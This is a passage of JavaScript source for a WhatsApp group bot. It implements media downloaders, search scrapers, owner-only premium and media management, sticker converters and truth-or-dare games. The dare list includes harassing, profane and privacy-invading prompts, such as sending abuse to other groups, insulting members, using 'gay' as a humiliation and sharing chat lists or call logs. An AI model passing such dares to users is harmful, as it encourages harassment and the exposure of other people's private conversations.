yudamods.sendMessage(m.chat, { video: { url: anu.result.HD }, caption: 'Here you go!.'}, {quoted: m})
}
break
case 'tiktok':{ 
if (!text) return replygcTzy( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcTzy(`Link Invalid!!`)
replygcTzy(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
yudamods.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokaudio':{
if (!text) return replygcTzy( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcTzy(`Link Invalid!!`)
replygcTzy(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
yudamods.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'mediafire':
if (!q) return replygcTzy(`Where is the link?`)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replygcTzy('The link you sent is not a mediafire link or the link is invalid!')
replygcTzy(mess.wait)
let medfr = await scp1.mediafire(q)
await yudamods.sendMessage(from, {document:{url:medfr.link},jpegThumbnail : defaultpp, fileName:`Downloaded By ${m.pushName}.${medfr.mime}`, mimetype:`application/${mime}`},{quoted:m})
break
case 'google': {
if (!q) return replygcTzy(`Example : ${prefix + command} ${botname}`)
replygcTzy(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcTzy(teks)
})
}
break
case 'happymod':{
if (!q) return replygcTzy(`Example ${prefix+command} Sufway surfer mod`)
replygcTzy(mess.wait)
let kat = await scp1.happymod(q)
replygcTzy(util.format(kat))
}
break
case 'recipe':{
if (!q) return replygcTzy(`Example ${prefix+command} samosa`)
replygcTzy(mess.wait)
let ker = await scp1.cariresep(q)
replygcTzy(util.format(ker))
}
break
case 'readrecipe':{
if (!q) return replygcTzy(`Example ${prefix+command} https://resepkoki.id/resep/resep-ayam-geprek-keju/`)
replygcTzy(mess.wait)
let rain = await scp1.bacaresep(q)
let dty = `Recipe Below
Title : ${rain.judul_nya}
Time : ${rain.waktu_nya}
Result : ${rain.hasil_nya}
Degree of difficulty : ${rain.tingkat_kesulitan}
Material :
${rain.bahan_nya}`
yudamods.sendMessage(m.chat,{
image:{
url:rain.thumb_nya},
caption:dty,
jpegThumbnail: defaultpp},
{quoted:m})
}
break
case 'search':
case 'yts': case 'ytsearch': {
                if (!text) return replygcTzy(`Example : ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                yudamods.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
case 'xxxxplay':{
if (!text) return replygcTzy(`Example : ${prefix+command} story wa anime`)
replygcTzy(mess.wait)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = `${ownernumber}@s.whatsapp.net`
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
yudamods.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
}
break
case 'play':  case 'song': case 'ytmp3': {
if (!text) return replygcTzy(`Example : ${prefix + command} anime whatsapp status`)
const Tzyplaymp3 = require('./lib/ytdl2')
const { fetchBuffer } = require("./lib/myfunc2")
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await Tzyplaymp3.mp3(anup3k.url)
await yudamods.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case 'ytmp4': case 'ytvideo': {
const Tzyvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !Tzyvidoh.isYTUrl(text)) replygcTzy(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await Tzyvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await yudamods.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'ytvxxx': case 'ytmp4xxx': case 'mp4xxx':{
if (!text) return replygcTzy('Enter the link!!!')
replygcTzy(mess.wait)
downloadMp4(text)
}
break
case 'ytaxxx': case 'ytmp3xxx': case 'mp3xxx':{
if (!text) return replygcTzy('Enter the link!!!')
replygcTzy(mess.wait)
downloadMp3(text)
}
break  
case 'getcase':
if (!TzyTheCreator) return replygcTzy(mess.owner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("TzyCheems7.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replygcTzy(`${getCase(q)}`)
break
case 'addprem':
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (!args[0]) return replygcTzy(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await yudamods.onWhatsApp(prrkek)
if (ceknya.length == 0) return replygcTzy(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcTzy(`The Number ${prrkek} Has Been Premium!`)
break
    case 'toptv':{
if (!TzyTheCreator) return replygcTzy('*Khusus Owner*')
 if (!quoted) throw `Balas Video Dengan Caption ${prefix + command}`
  if (/video/.test(mime)) {
var ppt = quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
yudamods.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break
case 'delprem':
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (!args[0]) return replygcTzy(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcTzy(`The Number ${ya} Has Been Removed Premium!`)
break
case 'addbadword':{
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (args.length < 1) return replygcTzy('Whats the word?')
if (BadTzy.includes(q)) return replygcTzy("The word is already in use")
BadTzy.push(q)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadTzy))
replygcTzy(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
}
break
case 'delbadword':{
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (args.length < 1) return replygcTzy('Enter the word')
if (!BadTzy.includes(q)) return replygcTzy("The word does not exist in the database")
let wanu = BadTzy.indexOf(q)
BadTzy.splice(wanu, 1)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadTzy))
replygcTzy(`Success deleting bad word ${q}`)
}
break
case 'listbadword':{
let teks = '┌──⭓「 *BadWord List* 」\n│\n'
for (let x of BadTzy) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${BadTzy.length}*`
replygcTzy(teks)
}
break
case 'addvideo':{
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (args.length < 1) return replygcTzy('Whats the video name?')
if (VideoTzy.includes(q)) return replygcTzy("The name is already in use")
let delb = await yudamods.downloadAndSaveMediaMessage(quoted)
VideoTzy.push(q)
await fsx.copy(delb, `./TzyMedia/video/${q}.mp4`)
fs.writeFileSync('./TzyMedia/database/Tzyvideo.json', JSON.stringify(VideoTzy))
fs.unlinkSync(delb)
replygcTzy(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (args.length < 1) return replygcTzy('Enter the video name')
if (!VideoTzy.includes(q)) return replygcTzy("The name does not exist in the database")
let wanu = VideoTzy.indexOf(q)
VideoTzy.splice(wanu, 1)
fs.writeFileSync('./TzyMedia/database/Tzyvideo.json', JSON.stringify(VideoTzy))
fs.unlinkSync(`./TzyMedia/video/${q}.mp4`)
replygcTzy(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoTzy) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoTzy.length}*`
replygcTzy(teks)
}
break
case 'addimage':{
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (args.length < 1) return replygcTzy('Whats the image name?')
if (ImageTzy.includes(q)) return replygcTzy("The name is already in use")
let delb = await yudamods.downloadAndSaveMediaMessage(quoted)
ImageTzy.push(q)
await fsx.copy(delb, `./TzyMedia/image/${q}.jpg`)
fs.writeFileSync('./TzyMedia/database/Tzyimage.json', JSON.stringify(ImageTzy))
fs.unlinkSync(delb)
replygcTzy(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (args.length < 1) return replygcTzy('Enter the image name')
if (!ImageTzy.includes(q)) return replygcTzy("The name does not exist in the database")
let wanu = ImageTzy.indexOf(q)
ImageTzy.splice(wanu, 1)
fs.writeFileSync('./TzyMedia/database/Tzyimage.json', JSON.stringify(ImageTzy))
fs.unlinkSync(`./TzyMedia/image/${q}.jpg`)
replygcTzy(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageTzy) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageTzy.length}*`
replygcTzy(teks)
}
break
case 'addsticker':{
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (args.length < 1) return replygcTzy('Whats the sticker name?')
if (StickerTzy.includes(q)) return replygcTzy("The name is already in use")
let delb = await yudamods.downloadAndSaveMediaMessage(quoted)
StickerTzy.push(q)
await fsx.copy(delb, `./TzyMedia/sticker/${q}.webp`)
fs.writeFileSync('./TzyMedia/database/Tzysticker.json', JSON.stringify(StickerTzy))
fs.unlinkSync(delb)
replygcTzy(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (args.length < 1) return replygcTzy('Enter the sticker name')
if (!StickerTzy.includes(q)) return replygcTzy("The name does not exist in the database")
let wanu = StickerTzy.indexOf(q)
StickerTzy.splice(wanu, 1)
fs.writeFileSync('./TzyMedia/database/Tzysticker.json', JSON.stringify(StickerTzy))
fs.unlinkSync(`./TzyMedia/sticker/${q}.webp`)
replygcTzy(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerTzy) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerTzy.length}*`
replygcTzy(teks)
}
break
case 'addvn':{
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (args.length < 1) return replygcTzy('Whats the audio name?')
if (VoiceNoteTzy.includes(q)) return replygcTzy("The name is already in use")
let delb = await yudamods.downloadAndSaveMediaMessage(quoted)
VoiceNoteTzy.push(q)
await fsx.copy(delb, `./TzyMedia/audio/${q}.mp3`)
fs.writeFileSync('./TzyMedia/database/Tzyvn.json', JSON.stringify(VoiceNoteTzy))
fs.unlinkSync(delb)
replygcTzy(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (args.length < 1) return replygcTzy('Enter the vn name')
if (!VoiceNoteTzy.includes(q)) return replygcTzy("The name does not exist in the database")
let wanu = VoiceNoteTzy.indexOf(q)
VoiceNoteTzy.splice(wanu, 1)
fs.writeFileSync('./TzyMedia/database/Tzyvn.json', JSON.stringify(VoiceNoteTzy))
fs.unlinkSync(`./TzyMedia/audio/${q}.mp3`)
replygcTzy(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteTzy) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteTzy.length}*`
replygcTzy(teks)
}
break
case 'addowner':
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (!args[0]) return replygcTzy(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await yudamods.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcTzy(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcTzy(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (!args[0]) return replygcTzy(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcTzy(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let yudamods of prem) {
teks += `- ${yudamods}\n`
}
teks += `\n*Total : ${prem.length}*`
yudamods.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setexif': {
               if (!TzyTheCreator) return replygcTzy(mess.owner)
               if (!text) return replygcTzy(`Example : ${prefix + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replygcxeom(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
case 'setppbot': case 'setbotpp': {
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (!quoted) return replygcTzy(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcTzy(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replygcTzy(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await yudamods.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/panjang`) {
var { img } = await generateProfilePicture(medis)
await yudamods.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replygcTzy(`Success`)
} else {
var memeg = await yudamods.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replygcTzy(`Success`)
}
}
break
case 'creategc': case 'creategroup': {
if (!TzyTheCreator) return replygcTzy(mess.owner)
if (!args.join(" ")) return replygcTzy(`Use ${prefix+command} groupname`)
try {
let cret = await yudamods.groupCreate(args.join(" "), [])
let response = await yudamods.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
yudamods.sendMessage(m.chat, { text:teks, mentions: await yudamods.parseMention(teks)}, {quoted:m})
} catch {
replygcTzy("Error!")
}
}
break
case 'snobg': {
if (!quoted) return replygcTzy(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await yudamods.downloadAndSaveMediaMessage(quoted)
let encmedia = await yudamods.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
replygcTzy(`Send/Reply Images With Captions ${prefix+command}`)
}
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
if (!isPrem) return replyprem(mess.group)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
yudamods.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'tomp4': case 'tovideo': {
                if (!quoted) return replygcTzy('Reply Image')
                if (!/webp/.test(mime)) return replygcTzy(`reply sticker with caption *${prefix + command}*`)
                replygcTzy(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await yudamods.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await yudamods.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcTzy(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return replygcTzy(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            yudamods.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) return replygcTzy(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcTzy(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!quoted) return replygcTzy(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            replygcTzy(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            yudamods.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${yudamods.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcTzy(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return replygcTzy(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            replygcTzy(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            yudamods.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) return replygcTzy('Reply video')
                if (!/webp/.test(mime)) return replygcTzy(`reply sticker with caption *${prefix + command}*`)
                replygcTzy(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await yudamods.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await yudamods.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return replygcTzy(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await yudamods.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I missðŸ¥ºðŸ‘‰ðŸ¼ðŸ‘ˆðŸ¼",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner Tzy through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const Tzydare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              yudamods.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ Tzydare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, Tzy?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const Tzytruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              yudamods.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ Tzytruth }, {quoted:m})
              break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
